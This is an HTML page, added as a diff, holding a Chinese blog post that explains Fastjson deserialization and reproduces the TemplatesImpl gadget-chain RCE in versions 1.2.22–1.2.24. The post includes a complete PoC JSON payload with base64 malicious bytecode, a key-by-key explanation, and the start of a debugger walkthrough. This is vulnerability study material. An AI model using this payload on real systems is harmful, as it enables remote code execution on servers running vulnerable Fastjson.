@@ -1,0 +1,828 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"apsry.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="fastjson反序列化笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson反序列化笔记">
+<meta property="og:url" content="https://apsry.github.io/2022/03/10/fastjson/index.html">
+<meta property="og:site_name" content="apsry">
+<meta property="og:description" content="fastjson反序列化笔记">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203291724674.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031632705.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031808180.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031845501.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031846156.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031848478.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031932294.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031933840.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031934212.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031935722.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031935364.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031938609.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031942286.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031950196.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031951122.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031953668.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031954483.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031959386.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032000656.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032005472.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032007092.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032007330.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032008098.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032008303.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032009477.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032010692.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032010983.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032020409.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032021478.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032024346.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032025905.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032029127.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032030573.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032032960.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032034149.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032035178.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032056788.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032039916.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032041633.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032106945.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032106293.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032105074.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032105299.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032105481.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032105295.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032105461.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032103572.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032105292.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225678.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225625.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225143.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225302.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225152.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225146.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225199.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225555.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225920.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225027.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225007.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225548.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225383.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225115.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225991.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225034.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225502.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225299.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225121.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032226536.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225354.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032225847.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032226948.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032226549.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032226337.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032226554.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032226194.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032226566.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204032226904.png">
+<meta property="article:published_time" content="2022-03-10T11:26:00.000Z">
+<meta property="article:modified_time" content="2022-04-03T14:38:42.767Z">
+<meta property="article:author" content="apsry">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203291724674.png">
+
+<link rel="canonical" href="https://apsry.github.io/2022/03/10/fastjson/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>fastjson反序列化笔记 | apsry</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+<!-- 引入目录截取js -->
+<script type="text/javascript" src="/js/src/abstract.js"></script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">apsry</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">去留无意，宠辱不惊</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://apsry.github.io/2022/03/10/fastjson/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="apsry">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="apsry">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          fastjson反序列化笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-03-10 19:26:00" itemprop="dateCreated datePublished" datetime="2022-03-10T19:26:00+08:00">2022-03-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-03 22:38:42" itemprop="dateModified" datetime="2022-04-03T22:38:42+08:00">2022-04-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>fastjson反序列化笔记</p>
+<span id="more"></span>
+
+
+
+<h2 id="Fastjson反序列化漏洞基础"><a href="#Fastjson反序列化漏洞基础" class="headerlink" title="Fastjson反序列化漏洞基础"></a>Fastjson反序列化漏洞基础</h2><p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.javasec.org/java-vuls/FastJson.html">https://www.javasec.org/java-vuls/FastJson.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://drops.blbana.cc/">https://drops.blbana.cc/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/rwx6sb">https://www.yuque.com/tianxiadamutou/zcfd4v/rwx6sb</a></p>
+<h3 id="Fastjson简介"><a href="#Fastjson简介" class="headerlink" title="Fastjson简介"></a>Fastjson简介</h3><p><code>Fastjson</code>是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将 Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。<code>Fastjson</code>在阿里巴巴大规模使用，在数万台服务器上部署，Fastjson在业界被广泛接受。在2012年被开源中国评选为最受欢迎的国产开源软件之一。出现安全问题影响范围很广。</p>
+<h3 id="API介绍"><a href="#API介绍" class="headerlink" title="API介绍"></a>API介绍</h3><ul>
+<li>序列化：<code>String text = JSON.toJSONString(obj);</code></li>
+<li>反序列化：<ul>
+<li><code>JSON.parseObject</code> 返回JSONObject类型</li>
+<li><code>JSON.parse</code> 返回实际类型对象</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203291724674.png" alt="Alt text"></p>
+<h3 id="fastjson反序列化基础"><a href="#fastjson反序列化基础" class="headerlink" title="fastjson反序列化基础"></a>fastjson反序列化基础</h3><p><a target="_blank" rel="noopener" href="https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/#Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80">https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/#Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80</a></p>
+<h3 id="Fastjson-使用"><a href="#Fastjson-使用" class="headerlink" title="Fastjson 使用"></a>Fastjson 使用</h3><p>使用 Fastjson 无非是将类转为 json 字符串或解析 json 转为 JavaBean。</p>
+<h4 id="1-将类转为-json"><a href="#1-将类转为-json" class="headerlink" title="1. 将类转为 json"></a>1. 将类转为 json</h4><p>在这里我们最常用的方法就是 <code>JSON.toJSONString()</code> ，该方法有若干重载方法，带有不同的参数，其中常用的包括以下几个：</p>
+<ul>
+<li>序列化特性：<code>com.alibaba.fastjson.serializer.SerializerFeature</code>，可以通过设置多个特性到 <code>FastjsonConfig</code> 中全局使用，也可以在使用具体方法中指定特性。</li>
+<li>序列化过滤器：<code>com.alibaba.fastjson.serializer.SerializeFilter</code>，这是一个接口，通过配置它的子接口或者实现类就可以以扩展编程的方式实现定制序列化。</li>
+<li>序列化时的配置：<code>com.alibaba.fastjson.serializer.SerializeConfig</code> ，可以添加特点类型自定义的序列化配置。</li>
+</ul>
+<h4 id="2-将-json-反序列化为类"><a href="#2-将-json-反序列化为类" class="headerlink" title="2. 将 json 反序列化为类"></a>2. 将 json 反序列化为类</h4><p>将 json 数据反序列化时常使用的方法为<code>parse()</code>、<code>parseObject()</code>、<code>parseArray()</code>，这三个方法也均包含若干重载方法，带有不同参数：</p>
+<ul>
+<li>反序列化特性：<code>com.alibaba.fastjson.parser.Feature</code>，</li>
+<li>类的类型：<code>java.lang.reflect.Type</code>，用来执行反序列化类的类型。</li>
+<li>处理泛型反序列化：<code>com.alibaba.fastjson.TypeReference</code>。</li>
+<li>编程扩展定制反序列化：<code>com.alibaba.fastjson.parser.deserializer.ParseProcess</code>，例如<code>ExtraProcessor</code> 用于处理多余的字段，<code>ExtraTypeProvider</code> 用于处理多余字段时提供类型信息。</li>
+</ul>
+<p>先贴一下从大佬博客中拿来的早期版本的 fastjson 的框架图：</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031632705.png" alt="img"></p>
+<p>这里列举一些 fastjson 功能要点：</p>
+<ul>
+<li>使用 <code>JSON.parse(jsonString)</code> 和 <code>JSON.parseObject(jsonString, Target.class)</code>，两者调用链一致，前者会在 jsonString 中解析字符串获取 <code>@type</code> 指定的类，后者则会直接使用参数中的class。</li>
+<li>fastjson 在创建一个类实例时会通过反射调用类中符合条件的 getter&#x2F;setter 方法，其中 getter 方法需满足条件：方法名长于 4、不是静态方法、以 <code>get</code> 开头且第4位是大写字母、方法不能有参数传入、继承自 <code>Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong</code>、此属性没有 setter 方法；setter 方法需满足条件：方法名长于 4，以 <code>set</code> 开头且第4位是大写字母、非静态方法、返回类型为 void 或当前类、参数个数为 1 个。具体逻辑在 <code>com.alibaba.fastjson.util.JavaBeanInfo.build()</code> 中。</li>
+<li>使用 <code>JSON.parseObject(jsonString)</code> 将会返回 JSONObject 对象，且类中的所有 getter 与setter 都被调用。</li>
+<li>如果目标类中私有变量没有 setter 方法，但是在反序列化时仍想给这个变量赋值，则需要使用 <code>Feature.SupportNonPublicField</code> 参数。</li>
+<li>fastjson 在为类属性寻找 get&#x2F;set 方法时，调用函数 <code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code> 方法，会忽略 <code>_|-</code> 字符串，也就是说哪怕你的字段名叫 <code>_a_g_e_</code>，getter 方法为 <code>getAge()</code>，fastjson 也可以找得到，在 1.2.36 版本及后续版本还可以支持同时使用 <code>_</code> 和 <code>-</code> 进行组合混淆。</li>
+<li>fastjson 在反序列化时，如果 Field 类型为 <code>byte[]</code>，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code> 进行 base64 解码，对应的，在序列化时也会进行 base64 编码。</li>
+</ul>
+<h2 id="Fastjson反序列化漏洞复现"><a href="#Fastjson反序列化漏洞复现" class="headerlink" title="Fastjson反序列化漏洞复现"></a>Fastjson反序列化漏洞复现</h2><p>Fastjson在1.2.24以及之前版本存在远程代码执行高危安全漏洞，之后的版本引入了autoType的黑白名单机制。在Fastjson 1.2.22 — 1.2.24 版本的反序列化漏洞利用，主要有以下两种已知利用链</p>
+<ul>
+<li>TemplateImpl</li>
+<li>JNDI</li>
+</ul>
+<p>用的这个大佬的代码</p>
+<p><a target="_blank" rel="noopener" href="https://drops.blbana.cc/2020/04/01/Fastjson-TemplatesImpl-%E5%88%A9%E7%94%A8%E9%93%BE/">https://drops.blbana.cc/2020/04/01/Fastjson-TemplatesImpl-%E5%88%A9%E7%94%A8%E9%93%BE/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/BlBana/Learn-Java-Deserialization-Vulnerability/tree/master/src/main/java/cc/blbana/Fastjson">https://github.com/BlBana/Learn-Java-Deserialization-Vulnerability/tree/master/src/main/java/cc/blbana/Fastjson</a></p>
+<h3 id="TemplatesImpl-利用链"><a href="#TemplatesImpl-利用链" class="headerlink" title="TemplatesImpl 利用链"></a>TemplatesImpl 利用链</h3><h4 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h4><p><code>Feature.SupportNonPublicField</code> 需要开启，因为<code>_bytecodes</code> 和 <code>_outputProperties</code> 两个关键属性是私有的+</p>
+<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>这边先改下fastjson环境</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031808180.png" alt="image-20220403180823100"></p>
+<p>我们先把<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>注释了，这是后面版本用来利用的，这个放到后面讲</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031845501.png" alt="image-20220403184527397"></p>
+<p>先生成class文件</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031846156.png" alt="image-20220403184654058"></p>
+<p>然后执行</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031848478.png" alt="image-20220403184818334"></p>
+<p>payload</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="string">&quot;_bytecodes&quot;</span>:[<span class="string">&quot;yv66vgAAADQAMgoABwAkCgAlACYIACcKACUAKAcAKQoABQAkBwAqAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACNMY2MvYmxiYW5hL1RlbXBsYXRlc0ltcGwvRkpQYXlsb2FkOwEACkV4Y2VwdGlvbnMHACsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAsAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAHcGF5bG9hZAEAClNvdXJjZUZpbGUBAA5GSlBheWxvYWQuamF2YQwACAAJBwAtDAAuAC8BAARjYWxjDAAwADEBACFjYy9ibGJhbmEvVGVtcGxhdGVzSW1wbC9GSlBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAsAAAAOAAMAAAAMAAQADgANAA8ADAAAAAwAAQAAAA4ADQAOAAAADwAAAAQAAQAQAAEAEQASAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAUAAwAAAAgAAMAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAFQAWAAIADwAAAAQAAQAXAAEAEQAYAAIACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAAZAAwAAAAqAAQAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAGQAaAAIAAAABABsAHAADAA8AAAAEAAEAFwAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAcAAgAHQAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAQAAEAIgAAAAIAIw==&quot;</span>],<span class="string">&#x27;_name&#x27;</span>:<span class="string">&#x27;a.b&#x27;</span>,<span class="string">&#x27;_tfactory&#x27;</span>:&#123;&#125;,<span class="string">&quot;_outputProperties&quot;</span>:&#123; &#125;,<span class="string">&quot;_name&quot;</span>:<span class="string">&quot;a&quot;</span>,<span class="string">&quot;allowedProtocols&quot;</span>:<span class="string">&quot;all&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析下PoC里的关键key：</p>
+<ul>
+<li>@type ：用于存放反序列化时的目标类型，这里指定的是TemplatesImpl，Fastjson最终会按照这个类反序列化得到实例，因为调用了getOutputProperties方法，实例化了传入的bytecodes类，导致命令执行。需要注意的是，Fastjson默认只会反序列化public修饰的属性，outputProperties和_bytecodes由private修饰，必须加入<code>Feature.SupportNonPublicField</code> 在parseObject中才能触发；</li>
+<li>_bytecodes：继承<code>AbstractTranslet</code> 类的恶意类字节码，并且使用<code>Base64</code>编码</li>
+<li>_name：调用<code>getTransletInstance</code> 时会判断其是否为null，为null直接return，不会进入到恶意类的实例化过程；</li>
+<li>_tfactory：<code>defineTransletClasses</code> 中会调用其<code>getExternalExtensionsMap</code> 方法，为null会出现异常；</li>
+<li>outputProperties：漏洞利用时的关键参数，由于Fastjson反序列化过程中会调用其<code>getOutputProperties</code> 方法，导致<code>bytecodes</code>字节码成功实例化，造成命令执行。</li>
+</ul>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>直接下断点跟一下</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031932294.png" alt="image-20220403193253184"></p>
+<p>接下来我们就一步步进行分析</p>
+<p>位置：<code>JSON.parseObject()</code> 311行左右</p>
+<p>首先会创建默认的Json解析器parser，同时将我们的input作为输入进行传入</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031933840.png" alt="image-20220403193352702"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031934212.png" alt="image-20220403193439097"></p>
+<p>位置：<code>DefaultJSONParser</code> 构造函数 175行左右</p>
+<p>跟进<code>DefaultJSONParser</code> ，会获取我们input中的第一个字符，然后进入if判断中，如果第一个字符是<code>&#123;</code> 那么就将12赋值给lexer.token</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031935722.png" alt="image-20220403193513607"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204031935364.png" alt="image-20220403193557247"></p>
+<p>位置：<code>JSON.parseObject()</code> 311行左右</p>
+<p>继续回到parseObject函数中，调用parser的parserObject来解析我们传入的类</p>
